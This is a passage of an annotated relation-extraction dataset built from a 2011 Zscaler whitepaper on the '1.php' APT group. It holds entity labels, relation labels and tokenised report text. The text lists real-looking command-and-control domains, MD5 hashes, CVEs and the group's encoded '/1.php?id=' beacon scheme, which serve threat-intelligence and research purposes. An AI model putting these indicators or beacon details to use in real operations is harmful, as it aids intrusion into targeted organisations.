["8caf2a96e4d7bb83156c260ccc8f47e7"], ["a4ff66224a0967763e1d079c99482577"], ["f0b93bf7273cbeaed69ed55b5169daf7"], ["3be6fea2bf35c3c3be860622c68ff369"], ["5fa26f410d0133f4152ea78df3978c22"], ["3d10e68dec16b1a4bf949e3e403f2dda"], ["5c371a6dfb45f188fe8e6da4fee9300d"], ["9ff3a9ef192453ecec26cf567c579bff"], ["65445b138d80954cc912a6e43fe5b66d"], ["685805936d8744225f8c11965202de8e"], ["80e978d0eea713812f1dd6b4e9b7daf2"], ["921c724ccb04b9f672b294ffff83ce7b"], ["072877b961e31e8792a296c63b9c7b56"], ["1a8bc862ceaa7e05189345065145842a"], ["6794cc6f5e463ee7432b9e718d8c1b8e"], ["fdb949112cc72c68fc7c1ea0c65344bc"], ["f4a6114fce22eb18b0ccf19cfa68ddba"], ["1045e26819ff782015202838e2c609f7"], ["5640beb540bef2e97ec4366713d533b8"], ["0f93d28964b440c241ca126a7f94dae2"], ["075df4723073ff08cd3e90d2b1f11722"], ["240627a306f32483378e44ff13e12169"], ["5f2a4d865e6e94f7f15571faab5128d6"], ["3bfa7b806ff540cc1c264ec75048fbc4"], ["05a02e08cce99d3821574d8612f757fd"], ["d60cfe03bce8647cce723991e2cd2f8c"], ["6ed270da7450945a3a5a05eda8312732"], ["a1083968b78c081135268b6e4e12b1e5"], ["0fce05e2cea6bd9c217373f2ab962d82"], ["85ef19fab3951d4dd56e42b5a9ccdeea"], ["422f1ffe7e5bda7062f005be92fba36e"], ["346aa61b5739e616482a1bc8bb548871"], ["c2661e45ec2198b04b29ec3fd1e120b2"], ["e04e5eb4aefeb326246d7f41d1b50759"], ["eb1aa241b4a482ac44b27ce38eabccb7"], ["418fb9ba2a61bccab3e54ebe0698c4b6"], ["590e68aaaa5c2353b7288f64cc87d9bb"], ["1f9894e730c0f5ba085baae409aa963a"], ["11b76423f450ba610f073e7522eeb56b"], ["54d37fb1f624c798f0b400b4f50f3635"], ["7fda0451e4d320cc34efcaaabedd6824"], ["84fc624f9f5f8de6980497058db1e8e1"], ["964eec615f977b05bc87943ce0942cf9"], ["5069057b799636c012eec38147fb96e6"], ["a4a1670c537861f7d5b0db115a7aa5fa"], ["00b9619613bc82f5fe117c2ca394a328"], ["2219bef789ff73efc0a01f87be03188d"]]}], [{"vertexSet": [{"old_id": "T1", "type": "AttackerGroup", "name": "1php", "sent_id": 7, "pos": []}, {"old_id": "T2", "type": "Exploit", "name": "spear-phishing emails", "sent_id": 8, "pos": [8, 9]}, {"old_id": "T3", "type": "Exploit", "name": "malicious PDF attachments", "sent_id": 9, "pos": [1, 3]}, {"old_id": "T4", "type": "Exploit", "name": "web links to binary executables", "sent_id": 9, "pos": [5, 9]}, {"old_id": "T5", "type": "Malware", "name": "Poison Ivy", "sent_id": 10, "pos": [2, 3]}, {"old_id": "T6", "type": "Country", "name": "China", "sent_id": 11, "pos": []}, {"old_id": "T7", "type": "Country", "name": "US", "sent_id": 11, "pos": []}, {"old_id": "T8", "type": "ExploitTargetObject", "name": "Defense entities", "sent_id": 12, "pos": [0, 1]}, {"old_id": "T9", "type": "ExploitTargetObject", "name": "Geospatial industry", "sent_id": 12, "pos": [5, 6]}, {"old_id": "T10", "type": "Organization", "name": "Zscaler", "sent_id": 12, "pos": [8]}, {"old_id": "T11", "type": "Software", "name": "ThreatlabZ", "sent_id": 52, "pos": [5]}, {"old_id": "T12", "type": "Organization", "name": "Zscaler", "sent_id": 52, "pos": [4]}, {"old_id": "T13", "type": "Time", "name": "2009", "sent_id": 124, "pos": [10]}, {"old_id": "T14", "type": "Attacker", "name": "1php", "sent_id": 122, "pos": []}, {"old_id": "T15", "type": "File", "name": "WWWDREAMLIFESNET/Afghanistan/Afghanistanzip", "sent_id": 139, "pos": []}, {"old_id": "T16", "type": "MD5", "name": "052E62513505A25CCFADF900A052709C", "sent_id": 140, "pos": [1]}, {"old_id": "T17", "type": "Malware", "name": "Poison Ivy RAT", "sent_id": 142, "pos": [6, 8]}, {"old_id": "T18", "type": "Vulnerability", "name": "CVE-2009-4324", "sent_id": 145, "pos": [3]}, {"old_id": "T19", "type": "File", "name": "SUCHOSTEXE", "sent_id": 151, "pos": []}, {"old_id": "T20", "type": "File", "name": "Requestpdf", "sent_id": 151, "pos": []}, {"old_id": "T21", "type": "MD5", "name": "B0EECA383A7477EE689EC807B775EBBB", "sent_id": 152, "pos": [1]}, {"old_id": "T22", "type": "Malware", "name": "Poison Ivy RAT", "sent_id": 149, "pos": [6, 8]}, {"old_id": "T23", "type": "Indicator", "name": "CECONFLOWER-SHOWORG", "sent_id": 158, "pos": []}, {"old_id": "T24", "type": "Time", "name": "July 2011", "sent_id": 159, "pos": [4, 5]}, {"old_id": "T25", "type": "Attacker", "name": "1php", "sent_id": 157, "pos": []}, {"old_id": "T26", "type": "Country", "name": "Japan", "sent_id": 162, "pos": [4]}, {"old_id": "T27", "type": "Country", "name": "China", "sent_id": 162, "pos": [6]}, {"old_id": "T28", "type": "Country", "name": "Taiwan", "sent_id": 162, "pos": [8]}, {"old_id": "T29", "type": "Country", "name": "USA", "sent_id": 162, "pos": [10]}, {"old_id": "T30", "type": "Vulnerability", "name": "CVE-2010-2883", "sent_id": 165, "pos": [7]}, {"old_id": "T31", "type": "Vulnerability", "name": "CVE-2010-2883", "sent_id": 161, "pos": []}, {"old_id": "T32", "type": "Malware", "name": "Poison Ivy", "sent_id": 166, "pos": [2, 3]}, {"old_id": "T33", "type": "File", "name": "Halloweenscr", "sent_id": 170, "pos": []}, {"old_id": "T34", "type": "MD5", "name": "5B90896127179F0AD2E6628593CDB60D", "sent_id": 171, "pos": [1]}, {"old_id": "T35", "type": "Vulnerability", "name": "CVE-2010-2883", "sent_id": 164, "pos": [2]}, {"old_id": "T36", "type": "Indicator", "name": "FREECOFFEELAUCHCOM", "sent_id": 178, "pos": []}, {"old_id": "T37", "type": "Address", "name": "98126693", "sent_id": 178, "pos": []}, {"old_id": "T38", "type": "Indicator", "name": "FIREHAPPYSYTESNET", "sent_id": 179, "pos": []}, {"old_id": "T39", "type": "Address", "name": "98126693", "sent_id": 179, "pos": []}, {"old_id": "T40", "type": "MalwareCharacteristics", "name": "base64 encoded", "sent_id": 187, "pos": [2, 3]}, {"old_id": "T41", "type": "MalwareCharacteristics", "name": "0x3C", "sent_id": 187, "pos": [11]}, {"old_id": "T42", "type": "MalwareCharacteristics", "name": "0x3E", "sent_id": 188, "pos": [1]}, {"old_id": "T43", "type": "TrojanHorse", "name": "Win32Buzuscvdu7", "sent_id": 212, "pos": []}, {"old_id": "T44", "type": "TrojanHorse", "name": "TrojanWin32Agent eevf8", "sent_id": 212, "pos": []}, {"old_id": "T45", "type": "Indicator", "name": "FQDN/cssashxsc=[data1]&sp=[data2]&ad=[data3]&dh=[data4]&mr=[d ata5]&tk=", "sent_id": 251, "pos": []}, {"old_id": "T46", "type": "Indicator", "name": "HOUSESUPERDOGDREAMCOM", "sent_id": 263, "pos": []}, {"old_id": "T47", "type": "Indicator", "name": "HOMEALLMYDEARFRIENDSCOM", "sent_id": 264, "pos": []}, {"old_id": "T48", "type": "Indicator", "name": "GOOGLETIMESERVEIRCCOM", "sent_id": 265, "pos": []}, {"old_id": "T49", "type": "Indicator", "name": "INFOSPORTGAMEINFOCOM", "sent_id": 266, "pos": []}, {"old_id": "T50", "type": "Indicator", "name": "PEOPLEENJOYHOLIDAYSNET", "sent_id": 267, "pos": []}, {"old_id": "T51", "type": "Indicator", "name": "PEARHOSTSERVEHALFLIFECOM", "sent_id": 268, "pos": []}, {"old_id": "T52", "type": "Indicator", "name": "FQDN/[data1]/[data2]/[data3]/[data4]/[data5]", "sent_id": 275, "pos": [0]}, {"old_id": "T53", "type": "Indicator", "name": "SATELLITEQUICKSEARCHMOVIECOM", "sent_id": 287, "pos": []}, {"old_id": "T54", "type": "Indicator", "name": "WWWTOYHOPINGCOM", "sent_id": 288, "pos": []}, {"old_id": "T55", "type": "Indicator", "name": "WORKFREETHROWLINENET", "sent_id": 289, "pos": []}, {"old_id": "T56", "type": "Indicator", "name": "SEAANIMALFANSNET", "sent_id": 290, "pos": []}, {"old_id": "T57", "type": "Indicator", "name": "WWWSEARCHSEANET", "sent_id": 291, "pos": []}, {"old_id": "T58", "type": "Indicator", "name": "LOVEANIMALFANSNET", "sent_id": 292, "pos": []}, {"old_id": "T59", "type": "Indicator", "name": "WWWJOBCALLORG", "sent_id": 293, "pos": []}, {"old_id": "T60", "type": "Time", "name": "August 3 2011", "sent_id": 308, "pos": [2, 5]}, {"old_id": "T61", "type": "Attacker", "name": "1php", "sent_id": 301, "pos": []}, {"old_id": "T62", "type": "AttackerGroup", "name": "1php", "sent_id": 272, "pos": []}, {"old_id": "T63", "type": "Indicator", "name": "WWWSAVAGECOUNTYNET", "sent_id": 336, "pos": []}, {"old_id": "T64", "type": "Indicator", "name": "LOOKCAPTAINSABERTOOTHNET", "sent_id": 337, "pos": []}, {"old_id": "T65", "type": "Indicator", "name": "GEOINFOSERVEHTTPCOM", "sent_id": 338, "pos": []}, {"old_id": "T66", "type": "Indicator", "name": "ROSEOFFICESKYLINECOM", "sent_id": 339, "pos": []}, {"old_id": "T67", "type": "Indicator", "name": "WWWCAREERCHALLENGESNET", "sent_id": 340, "pos": []}, {"old_id": "T68", "type": "Indicator", "name": "OFFERAMERICAMSN", "sent_id": 341, "pos": []}, {"old_id": "T69", "type": "Indicator", "name": "firehappysytesnet", "sent_id": 358, "pos": []}, {"old_id": "T70", "type": "Host", "name": "free", "sent_id": 363, "pos": [0]}, {"old_id": "T71", "type": "Host", "name": "image", "sent_id": 364, "pos": [0]}, {"old_id": "T72", "type": "Host", "name": "tastfine", "sent_id": 367, "pos": [0]}, {"old_id": "T73", "type": "Host", "name": "house", "sent_id": 372, "pos": [0]}, {"old_id": "T74", "type": "Host", "name": "do:", "sent_id": 374, "pos": [0]}, {"old_id": "T75", "type": "Host", "name": "dream", "sent_id": 381, "pos": [0]}, {"old_id": "T76", "type": "Host", "name": "smart", "sent_id": 382, "pos": [0]}, {"old_id": "T77", "type": "Host", "name": "rose", "sent_id": 384, "pos": [0]}, {"old_id": "T78", "type": "Host", "name": "qinetiq", "sent_id": 388, "pos": [0]}, {"old_id": "T79", "type": "Host", "name": "qnao", "sent_id": 390, "pos": [0]}, {"old_id": "T80", "type": "Host", "name": "look", "sent_id": 394, "pos": [0]}, {"old_id": "T81", "type": "Host", "name": "www", "sent_id": 397, "pos": [0]}, {"old_id": "T82", "type": "Address", "name": "98126693", "sent_id": 365, "pos": []}, {"old_id": "T83", "type": "Indicator", "name": "dreamlifesnet", "sent_id": 366, "pos": []}, {"old_id": "T84", "type": "Indicator", "name": "seablownet", "sent_id": 370, "pos": []}, {"old_id": "T85", "type": "Indicator", "name": "superdogdreamcom", "sent_id": 371, "pos": []}, {"old_id": "T86", "type": "Indicator", "name": "allmydearfriendscom", "sent_id": 373, "pos": []}, {"old_id": "T87", "type": "Indicator", "name": "sportgameinfocom", "sent_id": 376, "pos": []}, {"old_id": "T88", "type": "Indicator", "name": "enjoyholidaysnet", "sent_id": 377, "pos": []}, {"old_id": "T89", "type": "Indicator", "name": "jobcallorg", "sent_id": 379, "pos": []}, {"old_id": "T90", "type": "Indicator", "name": "geoinfoservehttpcom", "sent_id": 380, "pos": []}, {"old_id": "T91", "type": "Address", "name": "17863130197", "sent_id": 383, "pos": []}, {"old_id": "T92", "type": "Address", "name": "464209130", "sent_id": 386, "pos": []}, {"old_id": "T93", "type": "Indicator", "name": "officeskylinecom", "sent_id": 387, "pos": []}, {"old_id": "T94", "type": "Indicator", "name": "captainsabertoothnet", "sent_id": 389, "pos": []}, {"old_id": "T95", "type": "Indicator", "name": "savagecountynet", "sent_id": 391, "pos": []}, {"old_id": "T96", "type": "Indicator", "name": "bakerhughesthrutherenet9", "sent_id": 402, "pos": []}, {"old_id": "T97", "type": "ExploitTargetObject", "name": "US Government", "sent_id": 406, "pos": [3, 4]}, {"old_id": "T98", "type": "ExploitTargetObject", "name": "Defense Industrial Base", "sent_id": 406, "pos": [7, 9]}, {"old_id": "T99", "type": "Attacker", "name": "1php", "sent_id": 404, "pos": []}, {"old_id": "T100", "type": "Software", "name": "IE 6", "sent_id": 472, "pos": [1, 2]}, {"old_id": "T101", "type": "Organization", "name": "Microsoft", "sent_id": 472, "pos": [0]}, {"old_id": "T102", "type": "AttackerGroup", "name": "Soysauce", "sent_id": 428, "pos": []}, {"old_id": "T103", "type": "AttackerGroup", "name": "Comment Crew", "sent_id": 429, "pos": []}, {"old_id": "T104", "type": "AttackerGroup", "name": "GIF89a", "sent_id": 429, "pos": []}, {"old_id": "T105", "type": "Exploit", "name": "steganography", "sent_id": 436, "pos": [6]}], "labels": [{"old_id": "R1", "r": "P3", "h": 4, "t": 0, "evidence": []}, {"old_id": "R2", "r": "P32", "h": 4, "t": 5, "evidence": [10, 11]}, {"old_id": "R3", "r": "P32", "h": 4, "t": 6, "evidence": [10, 11]}, {"old_id": "R4", "r": "P17", "h": 11, "t": 10, "evidence": [52]}, {"old_id": "R5", "r": "P33", "h": 13, "t": 12, "evidence": [122, 123, 124]}, {"old_id": "R6", "r": "P21", "h": 14, "t": 16, "evidence": [139, 140, 141, 142]}, {"old_id": "R7", "r": "P21", "h": 15, "t": 16, "evidence": [140, 141, 142]}, {"old_id": "R8", "r": "P7", "h": 16, "t": 17, "evidence": [142, 143, 144, 145]}, {"old_id": "R9", "r": "P21", "h": 18, "t": 21, "evidence": []}, {"old_id": "R10", "r": "P21", "h": 20, "t": 21, "evidence": []}, {"old_id": "R11", "r": "P21", "h": 19, "t": 21, "evidence": []}, {"old_id": "R12", "r": "P33", "h": 24, "t": 23, "evidence": [157, 158, 159]}, {"old_id": "R13", "r": "P21", "h": 22, "t": 21, "evidence": []}, {"old_id": "R14", "r": "P32", "h": 24, "t": 25, "evidence": [157, 158, 159, 160, 161, 162]}, {"old_id": "R15", "r": "P32", "h": 24, "t": 26, "evidence": [157, 158, 159, 160, 161, 162]}, {"old_id": "R16", "r": "P32", "h": 24, "t": 27, "evidence": [157, 158, 159, 160, 161, 162]}, {"old_id": "R17", "r": "P32", "h": 24, "t": 28, "evidence": [157, 158, 159, 160, 161, 162]}, {"old_id": "R18", "r": "P7", "h": 31, "t": 30, "evidence": []}, {"old_id": "R19", "r": "P7", "h": 31, "t": 29, "evidence": []}, {"old_id": "R20", "r": "P7", "h": 31, "t": 34, "evidence": []}, {"old_id": "R21", "r": "P21", "h": 32, "t": 31, "evidence": []}, {"old_id": "R22", "r": "P21", "h": 33, "t": 31, "evidence": []}, {"old_id": "R23", "r": "P33", "h": 60, "t": 59, "evidence": [301, 302, 303, 304, 305, 306, 307, 308]}, {"old_id": "R24", "r": "P17", "h": 100, "t": 99, "evidence": [472]}], "title": ["inputs/txt/201110Zscaler1php"], "sents": [["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["Whitepaper:"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "1"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["The", "following", "release", "statement", "provides", "a", "brief", "summary", "of"], ["information", "related", "to", "the", "\u201c1", ".", "php\u201d", "Group", "dating", "from", "2008", "to"], ["present", ".", "This", "Group\u2019s", "methods", "tend", "to", "be", "spear-phishing", "emails"], ["with", "malicious", "PDF", "attachments", "or", "web", "links", "to", "binary", "executables"], ["with", "a", "Poison", "Ivy", "remote", "administration", "tool", "(RAT)", "payload", ".", "The"], ["Group\u2019s", "targeted", "victims", "included", "China/US", "relations", "experts", ","], ["Defense", "entities", ",", "and", "the", "Geospatial", "industry", ".", "Zscaler", "detected"], ["repeated", "infections", "from", "this", "Group", "to", "a", "customer", "related", "to", "this"], ["target", "list", ".", "The", "following", "report", "summarizes", "the", "incident", "details", "to"], ["\u201c"], ["This", "Group\u2019s"], ["methods", "tend", "to"], ["be", "spear-phishing"], ["emails", "with", "malicious"], ["PDF", "attachments", "or"], ["web", "links", "to", "binary"], ["executables", "with", "a"], ["(RAT)", "payload", "."], ["\u201c"], ["Summary"], ["increase", "awareness", "of", "these", "attacks", "in", "order", "to", "increase", "detection", ","], ["-Zscaler", "ThreatLabZ"], ["response", ",", "and", "prevention", ".", "A", "much", "more", "detailed", "report", "has", "been"], ["provided", "to", "impacted", "parties", ",", "stakeholders", ",", "and", "other", "trusted"], ["groups", "dealing", "with", "these", "incidents", ".", "The", "larger", "report", "dives", "into"], ["more", "details", "about", "the", "command", "and", "control", "servers", "(C&Cs)"], ["would", "like", "to", "collaborate", ",", "please", "contact", "threatlabz@zscaler", ".", "com"], ["and", "we", "will", "share", "the", "detailed", "report", "with", "select", "entities", "."], ["Introduction"], ["Zscaler", "provides", "inline", "security", "and", "policy", "enforcement", "of", "web"], ["and", "email", "transactions", "to", "include", "full-content", "inspection", "and"], ["comprehensive", "transaction", "logging", "and", "analysis", ".", "Given", "that"], ["many", "of", "Zscaler\u2019s", "customers", "are", "large", "enterprises", ",", "it", "is", "not"], ["surprising", "that", "some", "have", "been", "the", "target", "of", "so", "called", "Advanced"], ["\u201c"], ["The", "Group\u2019s"], ["targeted", "victims"], ["included", "China/US"], ["relations", "experts", ","], ["Defense", "entities", ","], ["and", "the", "Geospatial"], ["industry", "."], ["\u201c"], ["being", "used", "by", "this", "Group", ".", "If", "you", "are", "working", "on", "similar", "research"], ["-Zscaler", "ThreatLabZ"], ["Persistent", "Threats", "(APTs)", ".", "During", "the", "course", "of", "our", "daily", "activities"], ["researching", "various", "threats", ",", "Zscaler", "ThreatlabZ", "often", "uncovers"], ["infected", "hosts", "that", "we", "believe", "have", "been", "compromised", "via"], ["attacks", "that", "bear", "the", "signature", "of", "an", "APT", "attack", ".", "While", "there", "is", "no"], ["universally", "accepted", "definition", "of", "APT", "attacks", ",", "for", "the", "purposes"], ["of", "this", "paper", "we", "will", "leverage", "Richard", "Bejtlich\u2019s", "blog", "post", "on", "the"], ["subject1", "."], ["1", ".", "http://taosecurity", ".", "blogspot.com/2010/01/what-is-apt-and-what-does-it-want.html"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "2"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["of", "computer", "intrusion", ".", "They", "can", "use", "the", "most", "pedestrian"], ["publicly", "available", "exploit", "against", "a", "well-known", "vulnerability", ",", "or"], ["they", "can", "elevate", "their", "game", "to", "research", "new", "vulnerabilities", "and"], ["develop", "custom", "exploits", ",", "depending", "on", "the", "target\u2019s", "posture", "."], ["\u2022", "Persistent", "means", "the", "adversary", "is", "formally", "tasked", "to"], ["accomplish", "a", "mission", ".", "They", "are", "not", "opportunistic", "intruders", ".", "Like"], ["an", "intelligence", "unit", "they", "receive", "directives", "and", "work", "to", "satisfy"], ["their", "masters", ".", "Persistent", "does", "not", "necessarily", "mean", "they", "need"], ["to", "constantly", "execute", "malicious", "code", "on", "victim", "computers", "."], ["Rather", ",", "they", "maintain", "the", "level", "of", "interaction", "needed", "to", "execute"], ["their", "objectives", "."], ["\u2022", "Threat", "means", "the", "adversary", "is", "not", "a", "piece", "of", "mindless", "code", "."], ["This", "point", "is", "crucial", ".", "Some", "people", "throw", "around", "the", "term"], ["\u201cthreat\u201d", "with", "reference", "to", "malware", ".", "If", "malware", "had", "no", "human"], ["\u201c"], ["\u2026the", "adversary"], ["here", "is", "a", "threat"], ["because", "it", "is", "organized"], ["and", "funded", "and"], ["motivated", ".", "Some"], ["people", "speak", "of"], ["multiple", "\u201cgroups\u201d"], ["consisting", "of"], ["dedicated", "\u201ccrews\u201d"], ["with", "various", "missions", "."], ["\u201c"], ["\u2022", "Advanced", "means", "the", "adversary", "can", "operate", "in", "the", "full", "spectrum"], ["-Richard", "Bejtlich", ","], ["TaoSecurity", "blog"], ["attached", "to", "it", "(someone", "to", "control", "the", "victim", ",", "read", "the", "stolen"], ["data", ",", "etc", ".", "),", "then", "most", "malware", "would", "be", "of", "little", "worry", "(as", "long"], ["as", "it", "didn\u2019t", "degrade", "or", "deny", "data)", ".", "Rather", ",", "the", "adversary", "here"], ["is", "a", "threat", "because", "it", "is", "organized", "and", "funded", "and", "motivated", "."], ["Some", "people", "speak", "of", "multiple", "\u201cgroups\u201d", "consisting", "of"], ["dedicated", "\u201ccrews\u201d", "with", "various", "missions", "."], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "3"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["Contents"], ["Summary", ".", "......................................................................................................................", "1"], ["Introduction", ".", "...................................................................................................................", "1"], ["Section", "1:", "\u201c1", ".", "php\u201d", "Group", "Open-Source", "Intelligence", "(OSINT)", ".", ".........................................", "5"], ["Section", "2:", "Customer", "Infection", "Behavior", ".", "........................................................................", "8"], ["2", ".", "1", "GET", "Beacons", "with", "Modified", "XOR", "Parameters", ".", "........................................................", "8"], ["2", ".", "2", "GET", "Beacons", "with", "Data", "moved", "to", "URL", "path", ".", "...........................................................", "9"], ["2", ".", "3", "HTTPS", "CONNECTs", "to", "C&Cs", ".", "...................................................................................", "9"], ["Section", "3:", "Indent", "Inter-Relationships", ".", "............................................................................", "10"], ["3", ".", "1", "Possible", "Relationship", "to", "Other", "APT", "Incidents", ".", ".........................................................", "12"], ["Section", "4:", "Lessons", "Learned", ".", "..........................................................................................", "13"], ["4", ".", "1", "Conduct", "logging", "and", "analytics", "within", "your", "environment", ".", ".........................................", "13"], ["4", ".", "2", "Correlate", "with", "other", "sources", ".", "..................................................................................", "14"], ["4", ".", "3", "APTs", "are", "not", "always", "that", "\u2018Advanced", ".", ".......................................................................", "14"], ["4", ".", "4", "APTs", "are", "not", "limited", "to", "the", "United", "States", "Government", "or", "Defense", "Industrial", "Base", ".", "...", "14"], ["4", ".", "5", "APT", "Information", "Disclosure", "Remains", "a", "Challenge", ".", "..................................................", "15"], ["Conclusion", ".", "....................................................................................................................", "16"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "4"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["\u201c1", ".", "php\u201d", "Group", "Open-Source", "Intelligence", "(OSINT)"], ["There", "is", "a", "good", "deal", "of", "information", "in", "the", "public", "domain", "related", "to"], ["\u201c1", ".", "php\u201d", "Group", "incidents", "(malware", "and", "C&Cs)", "that", "can", "be", "correlated", "with"], ["incident", "activity", "that", "we", "identify", "and", "detail", "within", "this", "report", ".", "Intrusion"], ["activities", "related", "to", "this", "Group", "date", "back", "at", "least", "to", "2009", ",", "if", "not", "earlier"], ["(there", "is", "one", "sample", "we", "found", "dating", "back", "to", "2008)", ".", "For", "example", ",", "a"], ["December", "7", ",", "2009", "blog", "post", "by", "Contagio2", "details", "a", "malicious", "phishing"], ["email", "regarding", "United", "States", "troop", "deployment", "in", "Afghanistan", "that"], ["\u201c"], ["Once", "unzipped", ","], ["the", "malware", "is", "a"], ["Windows", "executable"], ["with", "an", "SCR", "extension"], ["that", "is", "identified", "as", "a"], ["Poison", "Ivy", "RAT", "variant", "."], ["\u201c"], ["Section", "1:"], ["-Zscaler", "ThreatLabZ"], ["provides", "a", "malicious", "link", "to:"], ["File", "name:", "WWW", ".", "DREAMLIFES.NET/Afghanistan/Afghanistan.zip."], ["MD5:", "052E62513505A25CCFADF900A052709C"], ["Once", "unzipped", ",", "the", "malware", "is", "a", "Windows", "executable", "with", "an", "SCR"], ["extension", "that", "is", "identified", "as", "a", "Poison", "Ivy", "RAT", "variant", ".", "Beyond", "simple"], ["phishing", "attacks", "with", "links", "to", "malware", ",", "the", "Group", "also", "sends", "spearphishing", "emails", "with", "malicious", "PDF", "attachments", "to", "their", "targets", ".", "For"], ["example", ",", "the", "SANS", "ISC", "Handler\u2019s", "Diary", "drew", "attention", "to", "this", "Group\u2019s"], ["phishing", "campaign", "exploiting", "CVE-2009-4324", "in", "January", "2010", ".", "A"], ["screenshot", "of", "their", "story", "headline", "is", "below", "in:", "Figure", "1", "SANS", "ISC", "Diary"], ["Headline", "related", "to", "\u201c1", ".", "php\u201d", "malware", "campaign3", "."], ["Figure", "1", "SANS", "ISC", "Diary", "Headline", "related", "to", "\u201c1", ".", "php\u201d", "malware", "campaign"], ["An", "example", "of", "one", "of", "the", "Poison", "Ivy", "RAT", "payloads", "used", "during", "this"], ["campaign", "was:"], ["File", "name:", "SUCHOST", ".", "EXE", "dropped", "from", "Request", ".", "pdf", "email", "attachment"], ["MD5:", "B0EECA383A7477EE689EC807B775EBBB"], ["2", ".", "http://contagiodump", ".", "blogspot.com/2009/12/attack-of-day-poison-ivy-zip-download.html"], ["3", ".", "http://isc", ".", "sans.edu/diary.html?storyid=7867"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "5"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["This", "file", "received", "commands", "from:", "CECON", ".", "FLOWER-SHOW.ORG."], ["More", "recently", ",", "in", "July", "2011", ",", "open-source", "reports4", "exist", "of", "Poison", "Ivy"], ["usage", "surrounding", "the", "FLOWER-SHOW", ".", "ORG", "domain", ".", "This", "incident"], ["exploited", "PDF", "vulnerabilities", "(CVE-2010-2883)", "in", "attached", "spear-phishing"], ["emails", "targeting", "experts", "on", "Japan", ",", "China", ",", "Taiwan", "/", "USA", "relationships", "."], ["See", "a", "screenshot", "of", "the", "email", "in:", "Figure", "2", "Spear-phishing", "email", "with"], ["attachment", "exploiting", "CVE-2010-2883", "."], ["Figure", "2", "Spear-phishing", "email", "with", "attachment", "exploiting", "CVE-2010-2883"], ["Once", "the", "Poison", "Ivy", "payload", "is", "installed", ",", "it", "frequently", "uses", "a", "unique"], ["beaconing", "pattern", "to", "communicate", "with", "a", "C&C", "server", ".", "To", "illustrate", "the"], ["communication", "sequence", ",", "reference", "the", "Joebox", "sandbox", "report5", "for", "the"], ["following", "file:"], ["File", "name:", "Halloween", ".", "scr"], ["MD5:", "5B90896127179F0AD2E6628593CDB60D"], ["4", ".", "http://contagiodump", ".", "blogspot.com/2011/07/jul-13-cve-2010-2883-pdf-meeting-agenda.html"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "6"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["\u2022"], ["Communicates", "with", "C&Cs:"], ["\u2013", "FREE", ".", "COFFEELAUCH.COM", "(98", ".", "126.69.3)"], ["\u2013", "FIREHAPPY", ".", "SYTES.NET", "*", "(98", ".", "126.69.3)"], ["\u2022"], ["Via", "HTTP", "GET", "requests", "to", "the", "path:", "/1", ".", "php?id=[data1]&id=[data2]"], ["&id=[data3]&id=[data4]&id=&id="], ["\u2013", "2", ".", "php,", "3", ".", "php,", "and", "4", ".", "php", "with", "id", "parameters", "and", "some", "with", "an"], ["ending", "&Done", "have", "also", "been", "observed"], ["\u2013", "The", "data", "parameters", "are", "information", "about", "the", "infected", "host", "(IP", ","], ["hostname", ",", "MAC", "address", ",", "username", ",", "and", "OS/system", "version)", "that"], ["have", "been", "base64", "encoded", "and", "then", "XORed", ".", "XOR", "keys", "of", "0x3C"], ["and", "0x3E", "have", "been", "observed", "."], ["An", "asterisk", "following", "a", "domain", "will", "designate", "No-IP6", "dynamic", "DNS"], ["\u201c"], ["The", "\u201c1", ".", "php?=\u201d"], ["HTTP", "GET", "request", "for"], ["the", "initial", "C&C", "checkin", "has", "been", "identified"], ["in", "the", "majority", "of", "past"], ["incidents", "involving"], ["this", "Group", "and", "is"], ["the", "reason", "for", "the"], ["informal", "\u201c1", ".", "php\u201d"], ["name", "used", "to"], ["describe", "this", "intrusion"], ["set", "."], ["\u201c"], ["This", "report", "shows", "that", "once", "infected", ",", "the", "victim:"], ["-Zscaler", "ThreatLabZ"], ["domains", "in", "this", "report", ".", "Dynamic", "DNS", "is", "a", "service", "that", "provides", "free", ","], ["cheap", "flexible", "domain", "hostname", "to", "IP", "address", "resolution", "and", "No-IP", "is"], ["one", "of", "the", "many", "vendors", "in", "this", "space", "."], ["While", "the", "malware", "variants", "used", "are", "generally", "referred", "to", "as", "Poison"], ["Ivy", "variants", ",", "there", "are", "many", "cases", "of", "them", "being", "detected/labeled", "as", "a"], ["generic", "Trojan", ",", "Backdoor", ",", "or", "something", "else", "entirely", ".", "For", "example", ",", "in", "a"], ["December", "2009", "malware", "report", "Kaspersky", "lists", "one", "variant", "as", "Trojan", "."], ["Win32", ".", "Buzus.cvdu7", "and", "in", "June", "2010", "another", "as", "Trojan", ".", "Win32.Agent."], ["eevf8", "", "."], ["Note", "the", "\u201c1", ".", "php?id=\u201d", "HTTP", "GET", "request", "for", "the", "initial", "C&C", "check-in", "."], ["This", "specific", "behavior", "has", "been", "identified", "in", "the", "vast", "majority", "of", "past"], ["incidents", "involving", "this", "Group", "and", "is", "reason", "for", "the", "informal", "\u201c1", ".", "php\u201d"], ["name", "used", "to", "describe", "these", "intrusion", "sets", "within", "the", "report", ".", "More"], ["information", "may", "be", "garnered", "from", "the", "open-source", "community", ",", "but", "the"], ["above", "should", "be", "a", "sufficient", "introduction", "into", "the", "tactics", ",", "techniques", ",", "and"], ["procedures", "(TTPs)", "of", "this", "Group", "."], ["5", ".", "http://support", ".", "clean-mx.de/clean-mx/view_joebox.php?md5=9339bb2af4d8c07e63051d0f120530e1&id=679603"], ["6", ".", "http://www", ".", 